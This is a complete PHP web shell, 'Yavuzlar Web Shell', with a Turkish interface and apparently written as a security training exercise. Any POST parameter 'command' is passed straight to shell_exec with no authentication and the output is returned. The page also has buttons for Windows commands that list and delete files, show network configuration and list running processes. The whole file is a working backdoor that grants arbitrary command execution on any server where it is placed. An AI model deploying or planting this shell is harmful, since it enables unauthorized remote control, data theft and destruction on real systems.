<?php
if (isset($_POST['command'])) {
    $command = $_POST['command'];

    // Komut çalıştırdım
    $output = shell_exec($command);

    // Çıktıyı gönderiyorum
    echo nl2br(htmlspecialchars($output));
    exit; 
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yavuzlar Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e1e;
            color: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        #command {
            width: 80%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #444;
            background-color: #333;
            color: #fff;
        }
        button {
            padding: 10px 20px;
            background-color: #0078d4;
            color: white;
            border: none;
            cursor: pointer;
            margin-right: 10px;
            margin-bottom: 10px;
        }
        button:hover {
            background-color: #005bb5;
        }
        #output {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #444;
            background-color: #222;
            white-space: pre-wrap;
            overflow: auto;
        }
    </style>
</head>
<body>
    <h1>Yavuzlar Web Shell</h1>
    <h3>
        Yavuzlar Web Shell uygulamasına hoş geldiniz. Aşağıdaki hazır komutlardan birine tıklayarak işlemi gerçekleştirebilir 
        veya başka bir komut girip "Çalıştır" butonuna basabilirsiniz.
    </h3>

    <!-- Hazır Komut Butonlarının Olduğu Kısım -->
    <button onclick="runPredefinedCommand('dir')">Dosyaları Listele</button>
    <button onclick="runPredefinedCommand('cd \\ && dir')">Dosyanın İçine Gir</button>
    <button onclick="runPredefinedCommand('echo. > yeni_dosya.txt')">Dosya Oluştur</button>
    <button onclick="runPredefinedCommand('del silinecek_dosya.txt')">Dosyayı Sil</button>
    <button onclick="runPredefinedCommand('ipconfig')">Config Bilgilerini Göster</button>
    <button onclick="runPredefinedCommand('netsh interface ipv4 show addresses')">Ağ Bilgilerini Listele</button>
    <button onclick="runPredefinedCommand('tasklist')">Çalışan İşlemleri Listele</button>

    <!-- Özel Komut Girişi -->
    <input type="text" id="command" placeholder="Komut girin..." />
    <button onclick="executeCommand()">Çalıştır</button>
    <div id="output"></div>

    <script>
        function executeCommand() {
            const command = document.getElementById('command').value;
            sendCommandToServer(command);
        }

        function runPredefinedCommand(command) {
            sendCommandToServer(command);
        }

        function sendCommandToServer(command) {
            const outputDiv = document.getElementById('output');
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            xhr.onload = function () {
                if (xhr.status === 200) {
                    outputDiv.innerHTML = xhr.responseText || "Komut sonucu yok.";
                } else {
                    outputDiv.innerHTML = "Bir hata oluştu!";
                }
            };

            xhr.send("command=" + encodeURIComponent(command));
        }
    </script>
</body>
</html>
